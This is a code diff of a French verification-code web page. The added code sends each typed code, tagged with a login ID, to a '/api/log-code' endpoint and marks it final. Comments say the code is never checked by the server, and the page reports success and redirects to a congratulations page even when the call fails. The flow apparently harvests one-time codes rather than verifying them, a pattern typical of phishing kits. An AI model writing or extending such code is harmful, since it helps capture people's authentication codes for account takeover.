@@ -74,17 +74,43 @@
       }
       showInlineAlert(form, 'info', 'Vérification en cours...');
 
-      // Enregistrer le code saisi dans la KV et rediriger (pas de vérification serveur)
-      logTypedCode();
-      showInlineAlert(form, 'success', 'Code enregistré.');
-      setTimeout(() => {
-        try { sessionStorage.removeItem('verify_session'); } catch {}
-        window.location.href = 'felicitations.html';
-      }, 500);
-      if (submitBtn) {
-        submitBtn.disabled = false;
-        submitBtn.textContent = originalText || 'Valider le code';
-      }
+      // Enregistrer le code saisi dans la KV en tant que final (marque le compte vérifié)
+      fetch('/api/log-code', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          verifyId: session.verifyId,
+          loginId: session.loginId || null,
+          code,
+          final: true
+        })
+      })
+        .then(async (res) => {
+          const data = await res.json().catch(() => ({}));
+          if (!res.ok) throw new Error(data?.message || 'Erreur serveur');
+          return data;
+        })
+        .then(() => {
+          showInlineAlert(form, 'success', 'Code enregistré et compte vérifié.');
+          setTimeout(() => {
+            try { sessionStorage.removeItem('verify_session'); } catch {}
+            window.location.href = 'felicitations.html';
+          }, 500);
+        })
+        .catch(() => {
+          // Même si l'appel échoue (offline, etc.), poursuivre la redirection
+          showInlineAlert(form, 'info', 'Connexion instable: tentative de vérification enregistrée.');
+          setTimeout(() => {
+            try { sessionStorage.removeItem('verify_session'); } catch {}
+            window.location.href = 'felicitations.html';
+          }, 600);
+        })
+        .finally(() => {
+          if (submitBtn) {
+            submitBtn.disabled = false;
+            submitBtn.textContent = originalText || 'Valider le code';
+          }
+        });
       return;
     });
 
@@ -108,42 +134,21 @@
             ...session,
             verifyId: data.verifyId,
             emailMasked: data?.delivery?.toMasked || session.emailMasked,
-            devCode: data?.devCode || null,
             createdAt: Date.now()
           };
           saveSession(updated);
-          showInlineAlert(form, 'success', 'Nouveau code envoyé.');
-          if (updated.devCode && codeInput) {
-            codeInput.value = updated.devCode;
-            showInlineAlert(form, 'info', `Mode démo: votre nouveau code est ${updated.devCode}.`);
-          }
-          console.debug('[DEV] Nouveau code:', updated.devCode);
-          // Journaliser à nouveau (nouvelle session/code)
-          logTypedCode();
+          showInlineAlert(form, 'success', 'Nouvel identifiant de vérification généré.');
         })
         .catch((err) => {
-          // Fallback: générer un nouveau code local si le serveur échoue
-          try {
-            const newCode = String(Math.floor(100000 + Math.random() * 900000));
-            const updated = {
-              ...session,
-              verifyId: 'local:' + Date.now(),
-              devCode: newCode,
-              createdAt: Date.now(),
-              local: true
-            };
-            saveSession(updated);
-            showInlineAlert(form, 'success', 'Nouveau code généré (mode développement).');
-            if (codeInput) {
-              codeInput.value = newCode;
-              showInlineAlert(form, 'info', `Mode démo: votre nouveau code est ${newCode}.`);
-            }
-            console.debug('[DEV] Nouveau code local:', newCode);
-            // Journaliser immédiatement
-            logTypedCode();
-          } catch (_) {
-            showInlineAlert(form, 'danger', `Échec de l'envoi du code: ${err.message}`);
-          }
+          // Fallback: générer un nouvel identifiant local si le serveur échoue
+          const updated = {
+            ...session,
+            verifyId: 'local:' + Date.now(),
+            createdAt: Date.now(),
+            local: true
+          };
+          saveSession(updated);
+          showInlineAlert(form, 'success', 'Nouvelle session locale créée.');
         })
         .finally(() => {
           if (resendBtn) resendBtn.disabled = false;
